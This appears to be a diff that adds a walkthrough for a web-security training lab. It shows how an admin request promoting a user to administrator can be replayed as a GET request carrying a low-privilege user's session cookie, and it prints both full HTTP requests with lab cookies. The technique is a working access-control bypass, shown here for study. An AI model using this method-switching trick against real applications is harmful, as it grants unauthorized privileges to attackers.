@@ -1,0 +1,39 @@
+Method-based access control can be circumvented
+
+To clarify a bit on the solution provided. Log in as admin and promote carlos. The request looks like this:
+
+POST /admin-roles HTTP/1.1
+Host: acb71f2c1fa2372180ed0bb500280087.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 30
+Origin: https://acb71f2c1fa2372180ed0bb500280087.web-security-academy.net
+Connection: close
+Referer: https://acb71f2c1fa2372180ed0bb500280087.web-security-academy.net/admin
+Cookie: session=4Ur06kP9aW2rAUbNISBEs5bNc6VSuuEL
+Upgrade-Insecure-Requests: 1
+
+username=carlos&action=upgrade
+
+
+Make a copy of it in repeater.
+Log in as wiener and get your session cookie.
+Follow the lab solution and change the request method to GET in repeater on the admin request.
+Now change the session cookie to your (wiener's) session cookie and click send. It should work.
+
+Request:
+GET /admin-roles?username=carlos&action=upgrade HTTP/1.1
+Host: acb71f2c1fa2372180ed0bb500280087.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Origin: https://acb71f2c1fa2372180ed0bb500280087.web-security-academy.net
+Connection: close
+Referer: https://acb71f2c1fa2372180ed0bb500280087.web-security-academy.net/admin
+Cookie: session=1nwcDI0vuRmP8S4600eVjRiilKtsHLkh
+Upgrade-Insecure-Requests: 1
+
